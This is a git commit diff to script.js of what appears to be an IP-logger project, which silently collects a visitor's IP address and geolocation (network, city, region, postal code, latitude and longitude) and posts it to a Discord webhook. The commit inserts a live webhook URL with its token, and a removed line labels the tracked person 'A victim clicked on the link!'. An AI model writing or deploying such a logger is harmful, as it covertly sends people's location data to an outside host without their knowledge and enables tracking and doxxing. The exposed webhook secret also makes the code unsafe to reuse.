c00e72402f9dd66c585fe46ab7c85c86dd3449d9
a8q5 <gloomyontop1@gmail.com>
2025-09-09 21:32:49 -0500

    Add files via upload

--- script.js
+++ script.js
@@ -6,19 +6,19 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'YOUR WEBHOOK'; // replace with your webhook url
+                    const dscURL = 'https://discord.com/api/webhooks/1415144937003028671/f8r9jU6vQPYAzRCo84O6AFQSxQvkWUi5Ah3tsb6oniXogMFmDCb9oM1MxrBZ7istb-5i'; // replace with your webhook url
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
+                            username: "EZZZZ IP", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
                             content: `@here`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
+                                    title: 'ezpz',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
